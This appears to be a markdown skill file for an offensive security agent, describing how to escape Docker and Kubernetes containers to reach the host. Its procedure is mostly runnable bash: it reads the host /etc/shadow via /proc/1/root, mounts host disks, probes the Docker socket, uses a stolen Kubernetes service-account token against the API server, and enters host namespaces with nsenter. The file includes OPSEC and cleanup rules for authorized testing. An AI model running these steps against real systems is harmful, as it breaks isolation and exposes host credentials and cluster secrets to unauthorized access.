---
name: container-escape
description: Escape container isolation to access host system
version: 1.0.0
phase: post
category: post-exploitation
tags: [container, docker, kubernetes, escape, breakout]
tools: [curl, docker, kubectl]
difficulty: advanced
opsec_level: high
time_estimate: 5m
severity_if_found: critical
related_skills:
  - credential-dump-linux
  - lateral-movement
mitre_attack:
  - T1611
  - T1613
---

## When to Use

Use this skill when you have shell access inside a container and need to escape
to the underlying host. Common in Docker and Kubernetes environments where
misconfigurations allow breakout.

## Prerequisites

- Shell access inside a container
- curl for API probing
- docker or kubectl CLI (if accessible from inside container)

## Procedure

```bash
# 1. Check if running in a container
cat /proc/1/cgroup 2>/dev/null | head -5
ls -la /.dockerenv 2>/dev/null

# 2. Test privileged container (CAP_SYS_ADMIN)
cat /proc/1/status | grep -i cap
# Look for CapEff: 0000003fffffffff (full caps = privileged)

# 3. Attempt escape via /proc/1/root (privileged container)
ls -la /proc/1/root/etc/shadow
cat /proc/1/root/etc/passwd

# 4. Mount host filesystem (privileged)
mkdir -p /tmp/host
mount /dev/sda1 /tmp/host 2>/dev/null || mount /dev/vda1 /tmp/host 2>/dev/null
ls -la /tmp/host/

# 5. Docker socket escape
ls -la /var/run/docker.sock 2>/dev/null
# If accessible, create privileged container mounting host root:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# 6. Kubernetes service account abuse
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/pods

# 7. Host PID namespace escape (if hostPID: true)
nsenter -t 1 -m -u -i -n -p -- /bin/bash 2>/dev/null
ls -la /etc/shadow
```

## OPSEC Rules

- **CRITICAL**: Document escape method but do not persist backdoors
- Clean up any mounted filesystems after verification
- Do not modify host files beyond proof-of-concept
- Remove any created containers or Kubernetes resources
- Log escape technique for remediation report

## Verification

- Confirm host filesystem access (read /etc/passwd from host)
- Verify container escape is repeatable
- Check if additional host pivots are available
- Confirm access persists across container restarts

## Pitfalls

- Privileged containers may have seccomp profiles blocking escape
- Docker socket may be read-only mounted
- Kubernetes RBAC may restrict pod listing
- Some container runtimes (gVisor, Firecracker) prevent escape
- Host may have additional security layers (AppArmor, SELinux)

## Output Format

```
[ESCAPE] Container escape successful
  Method: /proc/1/root (privileged container)
  Host OS: Ubuntu 22.04
  Host access: /etc/shadow readable
  Severity: CRITICAL
  Evidence: Host /etc/passwd contents

[K8S] Service account token found
  Namespace: default
  Permissions: pod list, secrets read
  Severity: CRITICAL
```
